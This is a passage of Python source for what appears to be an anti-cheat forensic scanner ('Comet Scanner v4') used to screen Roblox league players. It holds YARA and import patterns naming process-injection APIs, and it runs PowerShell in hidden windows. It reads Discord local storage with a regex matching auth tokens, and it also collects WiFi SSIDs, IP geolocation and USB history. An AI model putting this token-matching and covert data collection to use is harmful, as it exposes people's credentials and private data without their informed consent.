                                if b"WriteProcessMemory" in hdr: suspicious.append("WPM import")
                                if b"CreateRemoteThread" in hdr: suspicious.append("CRT import")
                                if b"VirtualAllocEx" in hdr: suspicious.append("VAEx import")
                                if b"NtWriteVirtualMemory" in hdr: suspicious.append("NTWVM import")
                                if suspicious and not any(fp in fpath.lower() for fp in FALSE_POSITIVE_PATHS):
                                    kws = suspicious
                        except Exception: pass

                    if kws:
                        try:
                            stat = os.stat(fpath)
                            ctime = datetime.datetime.fromtimestamp(stat.st_ctime)
                            hits.append({"path":fpath,"name":fname,
                                         "sha1":sha1_file(fpath) if stat.st_size<50_000_000 else "N/A",
                                         "size":stat.st_size,"ext":os.path.splitext(fname)[1].lower(),
                                         "created":ctime,"keywords":kws})
                        except Exception: pass
        except Exception: pass

    lines = [f"\nScanned: {scanned}  Keyword Hits: {len(hits)}  Hash Hits: {len(hash_hits)}", "="*50]
    if hash_hits:
        lines.append("\n⚠ HASH-BASED DETECTIONS (renamed cheat files):")
        for h in hash_hits:
            lines.append(f"  ✗ {h['path']}")
            lines.append(f"    SHA1: {h['sha1']} — {h['reason']}")
    for i,h in enumerate(hits,1):
        lines.append(f"\n[{i}] {', '.join(h['keywords'])}")
        lines.append(f"    {h['path']}")
        lines.append(f"    SHA1: {h['sha1']}  Size: {h['size']}b  Ext: {h['ext']}")
        lines.append(f"    Created: {h['created'].strftime('%Y-%m-%d %H:%M:%S')}")
    if not hits and not hash_hits: lines.append("✓ No cheat files found.")
    return section("Cheat File Scan", lines), len(hits)+len(hash_hits), hits+hash_hits


def scan_yara():
    scan_dirs = [os.path.expanduser("~\\Downloads"), os.path.expanduser("~\\AppData\\Local")]
    hits = []; notes = []
    try:
        import yara
        rules = yara.compile(source=r"""
        rule CheatTool {
            strings: $upx="UPX0" $vmp="VMProtect" $i1="VirtualAllocEx" $i2="WriteProcessMemory" $i3="CreateRemoteThread"
            condition: 2 of them
        }""")
        use_yara = True
    except ImportError:
        use_yara = False
        notes.append("⚠ yara-python not installed — using heuristic scan\n")
    for base in scan_dirs:
        if not os.path.exists(base): continue
        for root,dirs,files in os.walk(base):
            if root.replace(base,"").count(os.sep)>3: dirs.clear(); continue
            for fname in files:
                if not fname.lower().endswith((".exe",".dll")): continue
                fpath = os.path.join(root,fname)
                try:
                    size = os.path.getsize(fpath)
                    if use_yara:
                        m = rules.match(fpath,timeout=5)
                        if m: hits.append({"path":fpath,"size":size,"sha1":sha1_file(fpath),"reason":f"YARA:{[r.rule for r in m]}"})
                    else:
                        with open(fpath,"rb") as f: hdr = f.read(512)
                        if not hdr.startswith(b"MZ"): continue
                        reasons = []
                        if b"UPX" in hdr: reasons.append("UPX packed")
                        if size < 10240: reasons.append("Tiny EXE")
                        if matches_keyword(fpath): reasons.append("keyword")
                        if reasons: hits.append({"path":fpath,"size":size,"sha1":sha1_file(fpath),"reason":" | ".join(reasons)})
                except Exception: pass
    lines = notes+[f"Hits: {len(hits)}","="*50]
    for i,h in enumerate(hits,1):
        lines.append(f"\n[{i}] {h['reason']}\n    {h['path']}\n    {h['size']}b | {h['sha1']}")
    if not hits: lines.append("✓ No suspicious executables.")
    return section("YARA / Heuristic", lines), len(hits), hits


def scan_unsigned():
    import subprocess, tempfile
    scan_dirs = [os.path.expanduser("~\\Downloads"), os.path.expanduser("~\\Desktop"),
                 os.path.expanduser("~\\AppData\\Local")]
    TRUSTED = ["microsoft","google","nvidia","amd","intel","logitech","razer","corsair",
               "steam","valve","epic games","discord","twitch","obs","adobe","spotify","zoom"]
    hits=[]; scanned=0; candidates=[]
    for base in scan_dirs:
        if not os.path.exists(base): continue
        try:
            for root,dirs,files in os.walk(base):
                if root.replace(base,"").count(os.sep)>3: dirs.clear(); continue
                dirs[:] = [d for d in dirs if not any(t in d.lower() for t in TRUSTED)]
                for fname in files:
                    if not fname.lower().endswith((".exe",".dll")): continue
                    fpath = os.path.join(root,fname)
                    try:
                        sz = os.path.getsize(fpath)
                        if sz >= 1024: candidates.append((fpath,sz)); scanned+=1
                    except Exception: pass
        except Exception: pass
    if not WINDOWS or not candidates:
        for fpath,size in candidates:
            try:
                with open(fpath,"rb") as f: hdr = f.read(256)
                if hdr.startswith(b"MZ") and matches_keyword(fpath):
                    hits.append({"path":fpath,"size":size,"sha1":sha1_file(fpath),"reason":"keyword","publisher":"N/A"})
            except Exception: pass
    else:
        try:
            with tempfile.NamedTemporaryFile(mode="w",suffix=".txt",delete=False,encoding="utf-8") as tf:
                tf_path = tf.name
                for fpath,_ in candidates: tf.write(fpath.replace("'","''")+"\n")
            ps = f"""
$results=@()
Get-Content '{tf_path}' | ForEach-Object {{
    $p=$_.Trim(); if($p -eq ''){{return}}
    try {{
        $s=Get-AuthenticodeSignature -LiteralPath $p -ErrorAction SilentlyContinue
        $status=if($s){{$s.Status}}else{{'Unknown'}}
        $subject=if($s -and $s.SignerCertificate){{$s.SignerCertificate.Subject}}else{{''}}
        $results+="$status`t$subject`t$p"
    }} catch {{ $results+="Unknown`t`t$p" }}
}}
$results
"""
            si = subprocess.STARTUPINFO()
            si.dwFlags = subprocess.STARTF_USESHOWWINDOW; si.wShowWindow = 0
            out = subprocess.run(["powershell","-NoProfile","-NonInteractive","-WindowStyle","Hidden","-Command",ps],
                                 capture_output=True,text=True,timeout=120,
                                 creationflags=subprocess.CREATE_NO_WINDOW,startupinfo=si)
            size_map = {fp:sz for fp,sz in candidates}
            for line in out.stdout.splitlines():
                parts = line.strip().split("\t",2)
                if len(parts) < 3: continue
                status,subject,fpath = parts
                if status.strip()=="Valid": continue
                if any(t in subject.strip().lower() for t in TRUSTED): continue
                sz = size_map.get(fpath.strip(),0)
                hits.append({"path":fpath.strip(),"size":sz,
                             "sha1":sha1_file(fpath.strip()) if sz<20_000_000 else "N/A",
                             "reason":f"Unsigned ({status.strip()})","publisher":subject.strip() or "None"})
        except Exception: pass
        finally:
            try: os.unlink(tf_path)
            except Exception: pass
    lines = [f"\nScanned: {scanned}  Unsigned: {len(hits)}","="*50]
    for i,h in enumerate(hits,1):
        lines.append(f"\n[{i}] {h['reason']}\n    {h['path']}\n    Publisher: {h.get('publisher','N/A')}\n    {h['size']}b | {h['sha1']}")
    if not hits: lines.append("✓ No suspicious unsigned executables.")
    return section("Unsigned Scan",lines),len(hits),hits


def scan_recycle_bin():
    rb = "C:\\$Recycle.Bin"; hits=[]; total=0
    last_mod = "Unknown"; mod_ts = None
    try:
        stat = os.stat(rb)
        mod_ts = datetime.datetime.fromtimestamp(stat.st_mtime)
        last_mod = mod_ts.strftime("%Y-%m-%d %H:%M:%S")
        for root,dirs,files in os.walk(rb):
            for f in files:
                total += 1
                kws = matches_keyword(f)
                if kws:
                    try:
                        fp = os.path.join(root,f)
                        mt = datetime.datetime.fromtimestamp(os.stat(fp).st_mtime)
                        hits.append((f,mt,kws))
                    except Exception: hits.append((f,None,kws))
    except Exception as e:
        return section("Recycle Bin",[f"Could not read: {e}"]),0,"Unknown"

    # Deleted file integrity — check if bin was recently modified (possible evidence wiping)
    recent_mod = False
    if mod_ts:
        delta = datetime.datetime.now() - mod_ts
        if delta.total_seconds() < 3600:  # Modified within 1 hour
            recent_mod = True

    # File replacement detection — look for $I (info) files without matching $R (data) files
    orphaned = []
    try:
        for root,dirs,files in os.walk(rb):
            i_files = {f[2:] for f in files if f.startswith("$I")}
            r_files = {f[2:] for f in files if f.startswith("$R")}
            for orphan in i_files - r_files:
                orphaned.append(os.path.join(root,"$I"+orphan))
    except Exception: pass

    lines = [f"\nLast Modified: {last_mod}  Total Items: {total}"]
    if recent_mod:
        lines.append("⚠ Recycle Bin modified within the last hour — possible evidence wiping")
    if orphaned:
        lines.append(f"\n⚠ {len(orphaned)} orphaned $I file(s) — file data was removed separately:")
        for o in orphaned[:5]: lines.append(f"  {o}")
    for fname,mt,kws in hits:
        mt_str = mt.strftime("%Y-%m-%d %H:%M:%S") if mt else "N/A"
        lines.append(f"  {fname} | {mt_str} | [{', '.join(kws)}]")
    if not hits: lines.append("✓ No cheat files in Recycle Bin.")
    integrity_hits = (1 if recent_mod else 0) + len(orphaned)
    return section("Recycle Bin", lines), len(hits)+integrity_hits, last_mod


def scan_sysmain():
    if not WINDOWS:
        return section("SysMain / Prefetch Service",["Windows only"]),0,False
    sysmain_disabled=False; start_value=None; state_str="Unknown"; lines=[]
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\SysMain",
                             0, winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        start_value,_ = winreg.QueryValueEx(key,"Start"); winreg.CloseKey(key)
        state_map = {2:"Automatic (Normal)",3:"Manual",4:"DISABLED"}
        state_str = state_map.get(start_value,f"Unknown ({start_value})")
        sysmain_disabled = (start_value==4)
    except Exception as e:
        lines.append(f"  Could not read SysMain registry: {e}")
    pf_dir="C:\\Windows\\Prefetch"; pf_count=0
    try: pf_count=len(glob.glob(os.path.join(pf_dir,"*.pf")))
    except Exception: pass
    pf_empty=pf_count<5; auto_fail=sysmain_disabled and pf_empty; hit_count=0
    lines.append(f"  SysMain Service State : {state_str}")
    lines.append(f"  Registry Start Value  : {start_value}")
    lines.append(f"  Prefetch File Count   : {pf_count}")
    lines.append("")
    if sysmain_disabled:
        hit_count+=3
        lines.append("  ⚠ SysMain is DISABLED — Prefetch logging suppressed")
        if pf_empty:
            hit_count+=5
            lines.append("  ✗ AUTO FAIL: SysMain disabled AND Prefetch folder nearly empty")
        else:
            lines.append(f"  NOTE: {pf_count} prefetch files still present")
    else:
        lines.append(f"  ✓ SysMain is running normally ({state_str})")
        if pf_count<10:
            hit_count+=1
            lines.append(f"  ⚠ Low prefetch count ({pf_count}) despite SysMain enabled — possible manual wipe")
        else:
            lines.append(f"  ✓ Prefetch file count normal ({pf_count} files)")
    return section("SysMain / Prefetch Service Check",lines),hit_count,auto_fail


def scan_running_processes():
    """Check running processes for cheat indicators AND Roblox injection detection."""
    if not WINDOWS:
        return section("Running Processes",["Windows only"]),0,[]
    hits=[]; roblox_pids=[]; suspicious_dlls=[]
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        # Get all processes
        out = subprocess.run(
            ["powershell","-NoProfile","-NonInteractive","-Command",
             "Get-Process | Select-Object Name,Id,Path | ConvertTo-Csv -NoTypeInformation"],
            capture_output=True,text=True,timeout=20,
            creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        procs = []
        for line in out.stdout.splitlines()[1:]:
            parts = line.strip('"').split('","')
            if len(parts)>=2:
                pname,pid = parts[0],parts[1]
                ppath = parts[2] if len(parts)>2 else ""
                procs.append({"name":pname.lower(),"pid":pid,"path":ppath.lower()})
                if "roblox" in pname.lower(): roblox_pids.append(pid)
                kws = matches_keyword(pname+" "+ppath)
                if kws: hits.append({"name":pname,"pid":pid,"path":ppath,"keywords":kws,"type":"process"})

        # If Roblox is running, check its loaded DLLs
        if roblox_pids:
            for pid in roblox_pids[:2]:
                dll_out = subprocess.run(
                    ["powershell","-NoProfile","-NonInteractive","-Command",
                     f"Get-Process -Id {pid} | Select-Object -ExpandProperty Modules | Select-Object FileName | ConvertTo-Csv -NoTypeInformation"],
                    capture_output=True,text=True,timeout=15,
                    creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
                for dline in dll_out.stdout.splitlines()[1:]:
                    dll = dline.strip().strip('"')
                    if not dll: continue
                    # Filter out known system DLLs
                    if any(fp in dll.lower() for fp in FALSE_POSITIVE_PATHS): continue
                    kws = matches_keyword(dll)
                    if kws:
                        suspicious_dlls.append({"dll":dll,"pid":pid,"keywords":kws})
    except Exception: pass

    lines = []
    if hits:
        lines.append(f"⚠ {len(hits)} suspicious process(es) found:")
        for h in hits:
            lines.append(f"  ✗ {h['name']} (PID:{h['pid']}) [{', '.join(h['keywords'])}]")
            if h['path']: lines.append(f"     {h['path']}")
    else:
        lines.append("  ✓ No suspicious processes running")

    if roblox_pids:
        lines.append(f"\n  Roblox PIDs: {', '.join(roblox_pids)}")
    if suspicious_dlls:
        lines.append(f"\n⚠ SUSPICIOUS DLLS INJECTED INTO ROBLOX:")
        for d in suspicious_dlls:
            lines.append(f"  ✗ {d['dll']}  [{', '.join(d['keywords'])}]")

    total_hits = len(hits)+len(suspicious_dlls)
    return section("Running Process / Injection Check",lines),total_hits,(hits,suspicious_dlls)


def scan_cleaners():
    """Detect PC cleaning / evidence wiping tools."""
    if not WINDOWS:
        return section("Cleaner Detection",["Windows only"]),0,"None"
    found=[]; hit_count=0

    # Check registry for cleaner installations
    for reg_path in CLEANER_SIGNATURES["registry_keys"]:
        for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                key = winreg.OpenKey(hive, reg_path, 0, winreg.KEY_READ)
                winreg.CloseKey(key)
                found.append(f"Registry: {reg_path}")
                hit_count+=2
            except Exception: pass

    # Check running processes
    try:
        si=subprocess.STARTUPINFO(); si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        out=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",
                            "Get-Process | Select-Object -ExpandProperty Name"],
                           capture_output=True,text=True,timeout=10,
                           creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        for proc in out.stdout.lower().splitlines():
            proc=proc.strip()
            if any(sig in proc for sig in CLEANER_SIGNATURES["processes"]):
                found.append(f"Running: {proc}")
                hit_count+=3
    except Exception: pass

    # Check common install paths
    cleaner_paths=[
        os.path.expandvars(r"%PROGRAMFILES%\CCleaner"),
        os.path.expandvars(r"%PROGRAMFILES%\PrivaZer"),
        os.path.expandvars(r"%PROGRAMFILES%\BleachBit"),
        os.path.expandvars(r"%APPDATA%\BleachBit"),
        os.path.expandvars(r"%LOCALAPPDATA%\PrivaZer"),
        os.path.expandvars(r"%PROGRAMFILES%\Eraser"),
        os.path.expandvars(r"%PROGRAMFILES(X86)%\CCleaner"),
    ]
    for cp in cleaner_paths:
        if os.path.exists(cp):
            found.append(f"Installed: {cp}")
            hit_count+=2

    # Prefetch for cleaners (even if uninstalled)
    pf_dir=r"C:\Windows\Prefetch"
    try:
        for pf in glob.glob(os.path.join(pf_dir,"*.pf")):
            pfname=os.path.basename(pf).lower()
            for sig in CLEANER_SIGNATURES["file_patterns"]:
                if sig.lower() in pfname:
                    mt=datetime.datetime.fromtimestamp(os.stat(pf).st_mtime).strftime("%Y-%m-%d %H:%M")
                    found.append(f"Prefetch trace: {os.path.basename(pf)} (last run: {mt})")
                    hit_count+=1
    except Exception: pass

    lines=[]
    if found:
        lines.append(f"⚠ {len(found)} cleaner indicator(s) found:")
        for f in found: lines.append(f"  ✗ {f}")
    else:
        lines.append("  ✓ No cleaning tools detected")

    summary = ", ".join(found[:3]) if found else "None detected"
    return section("Cleaner Detection",lines),hit_count,summary


def scan_network_vpn():
    """Detect VPN usage and show WiFi history (SSID list)."""
    if not WINDOWS:
        return section("Network / VPN",["Windows only"]),0,"Unknown"
    lines=[]; vpn_detected=False; vpn_info_str=""

    # Check for VPN adapter names
    vpn_adapter_keywords=["vpn","mullvad","nordvpn","expressvpn","surfshark","proton",
                          "windscribe","pia","privateinternetaccess","cyberghost",
                          "tap-","tun0","tun1","openvpn","wireguard"]
    try:
        si=subprocess.STARTUPINFO(); si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        out=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",
                            "Get-NetAdapter | Select-Object Name,InterfaceDescription,Status | ConvertTo-Csv -NoTypeInformation"],
                           capture_output=True,text=True,timeout=10,
                           creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        vpn_adapters=[]
        for line in out.stdout.splitlines()[1:]:
            line=line.strip().strip('"')
            ll=line.lower()
            if any(k in ll for k in vpn_adapter_keywords):
                vpn_adapters.append(line)
                vpn_detected=True
        if vpn_adapters:
            lines.append(f"⚠ VPN ADAPTER(S) DETECTED ({len(vpn_adapters)}):")
            for a in vpn_adapters: lines.append(f"  ✗ {a}")
        else:
            lines.append("  ✓ No VPN adapters detected")
    except Exception: pass

    # Current IP info
    try:
        req=urllib.request.Request("https://ipinfo.io/json",
            headers={"User-Agent":"CometScanner/4.0"})
        with urllib.request.urlopen(req,context=_ssl_ctx(),timeout=5) as r:
            ip_data=json.loads(r.read().decode())
        org=ip_data.get("org","Unknown")
        city=ip_data.get("city","?"); country=ip_data.get("country","?")
        ip=ip_data.get("ip","?")
        is_vpn_org=any(k in org.lower() for k in ["vpn","mullavd","nordvpn","hosting","cloud","linode","digitalocean","vultr","ovh","hetzner"])
        lines.append(f"\n  IP Address : {ip}")
        lines.append(f"  Location   : {city}, {country}")
        lines.append(f"  ISP/Org    : {org}")
        if is_vpn_org:
            lines.append("  ⚠ ISP looks like a VPN/hosting provider")
            vpn_detected=True
        vpn_info_str=f"IP:{ip} | {city},{country} | {org}"
    except Exception:
        lines.append("  IP info unavailable")
        vpn_info_str="IP lookup failed"

    # WiFi profile history (SSID names) — useful for 2-PC detection
    try:
        si=subprocess.STARTUPINFO(); si.dwFlags=subprocess.STARTF_USESHOWWINDOW; si.wShowWindow=0
        out=subprocess.run(["netsh","wlan","show","profiles"],
                           capture_output=True,text=True,timeout=8,
                           creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=si)
        ssids=re.findall(r"All User Profile\s*:\s*(.+)",out.stdout)
        ssids=[s.strip() for s in ssids if s.strip()]
        if ssids:
            lines.append(f"\n  WiFi Profiles saved ({len(ssids)}):")
            for s in ssids[:20]: lines.append(f"  ► {s}")
            if len(ssids)>20: lines.append(f"  ... and {len(ssids)-20} more")
        else:
            lines.append("\n  No WiFi profiles found (ethernet only or profiles cleared)")
    except Exception: pass

    return section("Network / VPN Detection",lines),(1 if vpn_detected else 0),vpn_info_str


def scan_discord_cache():
    """Read Discord cache to find account usernames/IDs — includes alt detection."""
    hits=[]; discord_paths=[
        os.path.expanduser(r"~\AppData\Roaming\discord\Local Storage\leveldb"),
        os.path.expanduser(r"~\AppData\Roaming\discordptb\Local Storage\leveldb"),
        os.path.expanduser(r"~\AppData\Roaming\discordcanary\Local Storage\leveldb"),
    ]
    TOKEN_RE=re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
    ID_RE=re.compile(r'"id"\s*:\s*"(\d{17,19})"')
    NAME_RE=re.compile(r'"username"\s*:\s*"([^"]{2,32})"')
    SWITCH_RE=re.compile(r'"lastSwitched"\s*:\s*"?(\d+)"?')
    accounts=[]; seen_ids=set()

    for base in discord_paths:
        if not os.path.exists(base): continue
        src=os.path.basename(os.path.dirname(base))
        try:
            for fname in os.listdir(base):
                if not (fname.endswith(".ldb") or fname.endswith(".log")): continue
                fpath=os.path.join(base,fname)
                try:
                    with open(fpath,"rb") as f: raw=f.read().decode("utf-8",errors="ignore")
                    ids=ID_RE.findall(raw)
                    names=NAME_RE.findall(raw)
                    tokens=TOKEN_RE.findall(raw)
                    switches=SWITCH_RE.findall(raw)
                    for uid in ids:
                        if uid not in seen_ids:
                            seen_ids.add(uid)
                            uname=names[0] if names else "Unknown"
                            # Convert last switched timestamp
                            last_sw="Unknown"
                            if switches:
                                try:
                                    ts=int(switches[0])
                                    if ts>1e12: ts=ts//1000
                                    last_sw=datetime.datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
                                except Exception: pass
                            accounts.append({"id":uid,"username":uname,
                                             "has_token":bool(tokens),
                                             "last_switched":last_sw,"source":src})
                except Exception: pass
        except Exception: pass

    lines=[f"\n  Discord cache paths scanned: {len(discord_paths)}",
           f"  Accounts found: {len(accounts)}",""]
    for acc in accounts:
        lines.append(f"  @{acc['username']}")
        lines.append(f"  ID           : {acc['id']}")
        lines.append(f"  Last Switched: {acc['last_switched']}")
        lines.append(f"  Token found  : {'⚠ YES' if acc['has_token'] else 'No'}")
        lines.append(f"  Source       : {acc['source']}")
        lines.append("  "+"─"*30)
    if len(accounts)>1:
        lines.append(f"\n⚠ {len(accounts)} DISCORD ACCOUNTS FOUND — possible alt accounts")
    if not accounts: lines.append("  No Discord accounts found in cache.")
    return section("Discord Account Cache",lines),max(0,len(accounts)-1),accounts


def scan_factory_reset():
    if not WINDOWS: return section("Factory Reset",["Windows only"]),False,""
    resets=[]
    try:
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SYSTEM\Setup",0,winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        try:
            hist_key=winreg.OpenKey(key,"Source OS",0,winreg.KEY_READ)
            i=0
            while True:
                try:
                    sub=winreg.EnumKey(hist_key,i)
                    sk=winreg.OpenKey(hist_key,sub,0,winreg.KEY_READ)
                    try:
                        prod,_=winreg.QueryValueEx(sk,"ProductName")
                        build,_=winreg.QueryValueEx(sk,"CurrentBuild")
                        when,_=winreg.QueryValueEx(sk,"InstallDate")
                        resets.append(f"{prod} (Build {build}) installed {when}")
                    except Exception: pass
                    winreg.CloseKey(sk); i+=1
                except OSError: break
            winreg.CloseKey(hist_key)
        except Exception: pass
        winreg.CloseKey(key)
    except Exception: pass
    try:
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows NT\CurrentVersion",
                           0,winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        prod,_=winreg.QueryValueEx(key,"ProductName"); build,_=winreg.QueryValueEx(key,"CurrentBuild")
        try: rel,_=winreg.QueryValueEx(key,"ReleaseId")
        except Exception: rel="?"
        try: idate,_=winreg.QueryValueEx(key,"InstallDate")
        except Exception: idate="Unknown"
        current=f"Current: {prod} (Build {build}, Release {rel}) — InstallDate: {idate}"
        winreg.CloseKey(key)
    except Exception: current="Could not read current Windows version"
    lines=[f"\n  {current}",""]
    if resets:
        lines.append("  Previous installs / resets:")
        for r in resets: lines.append(f"    ► {r}")
    else:
        lines.append("  No previous installs found (may indicate fresh install or cleared history)")
    reset_text=current+("\n  "+"\n  ".join(resets) if resets else "")
    return section("Factory Reset Detection",lines),bool(resets),reset_text


def scan_fastflags():
    SUSPICIOUS_FLAGS={
        "FFlagDebugGraphicsDisableDirect3D11":"Disables D3D11 (anti-cheat bypass)",
        "FFlagDisableNewIGMinDUA":"Disables input guard",
        "DFStringTaskSchedulerTargetFps":"Uncapped FPS exploit",
        "FFlagDebugRenderingSetDeterministic":"Rendering manipulation",
        "FFlagDisablePostFx":"Visual exploit flag",
        "FFlagEnableHyperscaleImpostors":"Known cheat flag",
        "FFlagFixGraphicsQuality":"Graphics bypass flag",
        "FFlagDebugDisableTelemetry":"Telemetry bypass",
        "FFlagEnableNewAnimationSystem":"Known exploit flag",
    }
    ff_paths=[
        os.path.expanduser(r"~\AppData\Local\Roblox\ClientSettings\ClientAppSettings.json"),
        os.path.expandvars(r"%LOCALAPPDATA%\Bloxstrap\Modifications\ClientSettings\ClientAppSettings.json"),
    ]
    hits=[]; all_flags={}
    for path in ff_paths:
        if not os.path.exists(path): continue
        try:
            with open(path,"r",encoding="utf-8",errors="ignore") as f:
                flags=json.loads(f.read())
            for k,v in flags.items():
                all_flags[k]=v
                if k in SUSPICIOUS_FLAGS:
                    hits.append(f"{k} = {v}  [{SUSPICIOUS_FLAGS[k]}]")
        except Exception: pass
    lines=[f"\n  Total FastFlags found: {len(all_flags)}",f"  Suspicious flags: {len(hits)}",""]
    if hits:
        for h in hits: lines.append(f"  ⚠ {h}")
    else:
        lines.append("  ✓ No suspicious FastFlags detected.")
    return section("FastFlag Detection",lines),len(hits),hits


def scan_drives():
    if not WINDOWS: return section("Drive Detection",["Windows only"]),False,""
    drives_found=[]; drive_warn=False; lines=[]
    try:
        key=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,r"SYSTEM\CurrentControlSet\Enum\USBSTOR",
                           0,winreg.KEY_READ|winreg.KEY_WOW64_64KEY)
        i=0
        while True:
            try:
                device=winreg.EnumKey(key,i)
                dk=winreg.OpenKey(key,device,0,winreg.KEY_READ); j=0
                while True:
                    try:
                        inst=winreg.EnumKey(dk,j)
                        ik=winreg.OpenKey(dk,inst,0,winreg.KEY_READ)
                        try: friendly,_=winreg.QueryValueEx(ik,"FriendlyName")
                        except Exception: friendly=device
                        drives_found.append(friendly)
                        winreg.CloseKey(ik); j+=1
                    except OSError: break
                winreg.CloseKey(dk); i+=1
            except OSError: break
        winreg.CloseKey(key)
    except Exception: pass
    current_letters=[]
    try:
        import string as _str
        for letter in _str.ascii_uppercase:
            if os.path.exists(f"{letter}:\\"): current_letters.append(f"{letter}:")
    except Exception: pass
    lines.append(f"  Current drives: {', '.join(current_letters) or 'None'}")
    lines.append(f"  USB history: {len(drives_found)} device(s)")
    if drives_found:
        lines.append("")
        for d in drives_found[:20]: lines.append(f"  ► {d}")
    if len(drives_found)>3:
        drive_warn=True
        lines.append(f"\n  ⚠ {len(drives_found)} USB storage devices — check for external drives")
    info_str=f"Current: {', '.join(current_letters)} | USB history: {len(drives_found)} devices"
    return section("Drive Detection",lines),drive_warn,info_str


# ============================================================
#  RUN FULL SCAN
# ============================================================
def run_full_scan(league="?"):
    sb_t,sb_h,_          = scan_shellbags()
    bm_t,bm_h,_          = scan_bam()
    pf_t,pf_h,_          = scan_prefetch()
    ac_t,ac_h,_          = scan_appcompat()
    rl_t,rl_h,accs       = scan_roblox_logs()
    al_t,al_h,_          = scan_roblox_alts_registry()
    cs_t,cs_h,_          = scan_cheat_files()
    yr_t,yr_h,_          = scan_yara()
    us_t,us_h,us_l       = scan_unsigned()
    rb_t,rb_h,rb_l       = scan_recycle_bin()
    sm_t,sm_h,auto_fail  = scan_sysmain()
    pr_t,pr_h,_          = scan_running_processes()
    cl_t,cl_h,cl_info    = scan_cleaners()
    nw_t,nw_h,vpn_info   = scan_network_vpn()
    dc_t,dc_h,dc_accs    = scan_discord_cache()
    fr_t,_,fr_text       = scan_factory_reset()
    ff_t,ff_h,ff_hits    = scan_fastflags()
    dv_t,dv_warn,dv_inf  = scan_drives()

    total = sb_h+bm_h+pf_h+ac_h+cs_h+yr_h+us_h+rb_h+rl_h+sm_h+ff_h+pr_h+cl_h+al_h+dc_h

    # No automatic verdict — let the agent decide
    verdict = "REVIEW"
    if auto_fail: verdict = "AUTO FAIL"

    roblox_list=[]
    if isinstance(accs,list):
        for a in accs:
            if isinstance(a,dict): roblox_list.append(a)
            else: roblox_list.append({"username":str(a),"userid":None,"sources":[],"placeids":[],"last_seen":None})

    return {
        "shellbags":sb_t,"bam":bm_t,"prefetch":pf_t,"appcompat":ac_t,
        "roblox":rl_t,"cheat":cs_t,"yara":yr_t,"unsigned":us_t,
        "recycle":rb_t,"sysmain":sm_t,"discord":dc_t,
        "processes":pr_t,"cleaners":cl_t,"network":nw_t,
        "registry_extra":al_t,
        "shellbag_hits":sb_h,"bam_hits":bm_h,"prefetch_hits":pf_h,"appcompat_hits":ac_h,
        "cheat_hits":cs_h,"yara_hits":yr_h,"unsigned_hits":us_l,
        "sysmain_hits":sm_h,"sysmain_autofail":auto_fail,
        "fastflag_hits":ff_h,"process_hits":pr_h,"cleaner_hits":cl_h,
        "roblox_accounts":roblox_list,
        "discord_accounts":dc_accs,
        "recycle_bin_time":rb_l if isinstance(rb_l,str) else "Unknown",
        "total_hits":total,"verdict":verdict,"league":league,
        "vpn_info":vpn_info,"cleaner_info":cl_info,
        "report":{
            "shellbag_hits":sb_h,"bam_hits":bm_h,"prefetch_hits":pf_h,"appcompat_hits":ac_h,
            "cheat_hits":cs_h,"yara_hits":yr_h,"unsigned_count":len(us_l) if isinstance(us_l,list) else us_h,
            "sysmain_hits":sm_h,"sysmain_autofail":auto_fail,
            "roblox_hits":rl_h,"fastflags":ff_hits,
            "discord_accounts":dc_accs,
            "factory_resets":fr_text,"drive_info":dv_inf,"drive_warn":dv_warn,
            "vpn_info":vpn_info,"cleaner_info":cl_info,
            "process_hits":pr_h,"cleaner_hits":cl_h,
        },
        "full_report":"\n".join([
            f"COMET SCANNER v4  |  {now_str()}  |  User: {current_user()}  |  League: {league}","="*60,
            sb_t,bm_t,pf_t,ac_t,rl_t,al_t,cs_t,yr_t,us_t,rb_t,sm_t,pr_t,cl_t,nw_t,dc_t,fr_t,ff_t,dv_t,
            f"\nAUTO FAIL: {auto_fail}",f"\nHITS: {total}  |  VERDICT: {verdict}",
        ]),
    }

# ============================================================
#  GUI  — Comet  Dark Futuristic
# ============================================================
class App:
    BG      = "#080b10"
    BG2     = "#0f1420"
    BG3     = "#131925"
    BG4     = "#1a2235"
    BG5     = "#1f2840"
    BORDER_HEX = "#141e2e"
    BORDER2 = "#1e2d44"
    FG      = "#f0f4ff"
    FG2     = "#8892a4"
    FG3     = "#3d4a5c"
    GREEN   = "#00f5a0"
    GREEN_D = "#00c97a"
    RED     = "#ff4d6d"
    AMBER   = "#ffb830"
    BLUE    = "#4d9fff"

    def __init__(self, root):
        self.root = root
        self.root.withdraw()
        self.results = {}
        self.scanning = False
        self._wh_sent = False
        self._pin = ""
        self._league = "UFF"
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        self._show_tos_screen()

    def _on_close(self):
        self.root.destroy()

    def _show_tos_screen(self):
        w = tk.Toplevel()
        self._tos_win = w
        w.title("Comet — Terms of Service")
        w.geometry("520x600")
        w.configure(bg=self.BG)
        w.resizable(False, False)
        w.protocol("WM_DELETE_WINDOW", lambda: (w.destroy(), self.root.destroy()))
        w.update_idletasks()
        sw, sh = w.winfo_screenwidth(), w.winfo_screenheight()
        w.geometry(f"520x600+{(sw-520)//2}+{(sh-600)//2}")

        cv = tk.Canvas(w, width=520, height=600, bg=self.BG, highlightthickness=0)
        cv.place(x=0, y=0)
